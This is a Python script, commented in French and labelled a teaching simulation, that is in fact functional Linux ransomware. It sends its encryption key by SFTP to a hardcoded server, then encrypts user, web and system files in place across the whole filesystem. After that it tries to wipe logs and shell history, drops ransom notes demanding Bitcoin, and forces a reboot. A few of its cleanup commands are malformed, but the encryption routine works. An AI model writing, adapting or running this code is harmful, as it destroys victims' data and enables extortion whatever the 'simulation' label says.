#!/usr/bin/env python3
# ransomware_total.py - Simulation pédagogique de ransomware Linux

import os
import sys
import logging
from pathlib import Path
from cryptography.fernet import Fernet
import paramiko
import socket
import subprocess
from datetime import datetime

# Configuration
LOG_FILE = "/var/log/ransomware_sim.log"
SFTP_SERVER = "192.168.239.130"  # À remplacer par votre serveur de test
SFTP_USER = "test"
SFTP_PASS = "test"  # En réel: utiliser clé SSH
SFTP_PORT = 22
SFTP_REMOTE_PATH = "/exfil/keys"
RANSOM_NOTE = "/root/README_RANSOM.txt"

# Setup logging
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def check_root():
    """Vérifie que le script est exécuté en root"""
    if os.geteuid() != 0:
        logging.error("Le script doit être exécuté en tant que root!")
        sys.exit(1)

def generate_key():
    """Génère une clé de chiffrement Fernet"""
    try:
        key = Fernet.generate_key()
        logging.info(f"Clé générée: {key.decode()}")
        return key
    except Exception as e:
        logging.error(f"Erreur génération clé: {str(e)}")
        sys.exit(1)

def exfiltrate_key(key):
    """Transmet la clé via SFTP"""
    try:
        transport = paramiko.Transport((SFTP_SERVER, SFTP_PORT))
        transport.connect(username=SFTP_USER, password=SFTP_PASS)
        sftp = paramiko.SFTPClient.from_transport(transport)

        hostname = socket.gethostname()
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        remote_filename = f"{hostname}_{timestamp}.key"

        # Création du répertoire distant si inexistant
        try:
            sftp.stat(SFTP_REMOTE_PATH)
        except FileNotFoundError:
            sftp.mkdir(SFTP_REMOTE_PATH)

        with sftp.open(f"{SFTP_REMOTE_PATH}/{remote_filename}", 'wb') as f:
            f.write(key)

        sftp.close()
        transport.close()
        logging.info(f"Clé exfiltrée vers {SFTP_SERVER}/{remote_filename}")
    except Exception as e:
        logging.error(f"Échec exfiltration: {str(e)}")
        sys.exit(1)

def encrypt_file(filepath, fernet):
    """Chiffre un fichier en place"""
    try:
        # Vérifie la taille du fichier (ne pas chiffrer les fichiers trop gros)
        if os.path.getsize(filepath) > 100 * 1024 * 1024:  # 100MB max
            logging.warning(f"Fichier trop volumineux, ignoré: {filepath}")
            return

        with open(filepath, 'rb') as f:
            data = f.read()

        encrypted_data = fernet.encrypt(data)

        with open(filepath, 'wb') as f:
            f.write(encrypted_data)

        logging.debug(f"Fichier chiffré: {filepath}")
    except Exception as e:
        logging.warning(f"Échec chiffrement {filepath}: {str(e)}")

def should_encrypt(path):
    """Détermine si un fichier doit être chiffré"""
    # Exclusions (optionnelles pour la simulation)
    exclusions = [
        '/proc/', '/sys/', '/dev/', '/run/', '/boot/', '/etc/shadow',
        '/etc/passwd', '/etc/group', '/etc/sudoers', '/root/',
        LOG_FILE, RANSOM_NOTE, __file__
    ]

    # Ne pas chiffrer les fichiers binaires et systèmes importants
    extensions_exclues = ['.py', '.sh', '.so', '.a', '.ko']

    path_str = str(path)
    return (all(excl not in path_str for excl in exclusions) and
            not any(path_str.endswith(ext) for ext in extensions_exclues))

def encrypt_system(fernet):
    """Parcourt et chiffre le système de fichiers"""
    logging.info("Début du chiffrement du système...")

    # Dossiers prioritaires à chiffrer en premier
    priority_targets = [
        '/home/', '/var/www/', '/opt/', '/srv/'
    ]

    # D'abord chiffrer les cibles prioritaires
    for target in priority_targets:
        if os.path.exists(target):
            for root, dirs, files in os.walk(target):
                for file in files:
                    filepath = os.path.join(root, file)
                    if should_encrypt(filepath):
                        try:
                            if os.path.isfile(filepath) and os.access(filepath, os.W_OK):
                                encrypt_file(filepath, fernet)
                        except Exception as e:
                            logging.warning(f"Erreur traitement {filepath}: {str(e)}")
                            continue

    # Ensuite le reste du système (sans les exclusions déjà gérées par should_encrypt)
    for root, dirs, files in os.walk('/'):
        for file in files:
            filepath = os.path.join(root, file)
            if should_encrypt(filepath):
                try:
                    if os.path.isfile(filepath) and os.access(filepath, os.W_OK):
                        encrypt_file(filepath, fernet)
                except Exception as e:
                    logging.warning(f"Erreur traitement {filepath}: {str(e)}")
                    continue

def create_ransom_note(key):
    """Crée un fichier de demande de rançon"""
    note = f"""
    ⚠️ VOTRE SYSTÈME A ÉTÉ CHIFFRÉ ⚠️

    Pour récupérer vos fichiers, vous devez:
    1. Payer 0.001 Bitcoin à l'adresse: FAKE_BTC_ADDRESS
    2. Envoyer un email à ransomware@example.com avec votre ID: {key[:8]}

    Toute tentative de récupération sans paiement entraînera la destruction de la clé!
    """

    try:
        # Créer aussi une copie dans /etc/ pour plus de visibilité
        with open(RANSOM_NOTE, 'w') as f:
            f.write(note)
        with open("/etc/README_RANSOM.txt", 'w') as f:
            f.write(note)
        logging.info("Note de rançon créée")
    except Exception as e:
        logging.error(f"Erreur création note: {str(e)}")

def disable_recovery():
    """Désactive les mécanismes de récupération"""
    try:
        # Désactive les snapshots
        subprocess.run(['systemctl', 'stop', 'snapd'], check=False)
        # Nettoie les fichiers temporaires
        subprocess.run(['rm', '-rf', '/tmp/*'], check=False)
        # Vide les logs
        subprocess.run(['echo', '', '>', '/var/log/syslog'], check=False, shell=True)
    except Exception as e:
        logging.warning(f"Échec désactivation récupération: {str(e)}")

def reboot_system():
    """Redémarre le système"""
    logging.info("Préparation du redémarrage...")
    try:
        # Efface l'historique bash
        with open('/root/.bash_history', 'w') as f:
            f.write('')
        subprocess.run(['history', '-c'], check=False, shell=True)
        subprocess.run(['shutdown', '-r', 'now'], check=True)
    except Exception as e:
        logging.error(f"Échec redémarrage: {str(e)}")
        sys.exit(1)

def main():
    check_root()
    logging.info("=== Début de la simulation ransomware ===")

    # Étape 1: Génération clé
    key = generate_key()
    fernet = Fernet(key)

    # Étape 2: Exfiltration
    exfiltrate_key(key)

    # Étape 3: Chiffrement
    encrypt_system(fernet)

    # Étape 4: Désactivation récupération
    disable_recovery()

    # Étape 5: Note de rançon
    create_ransom_note(key.decode())

    # Étape 6: Redémarrage
    reboot_system()

if __name__ == "__main__":
    main()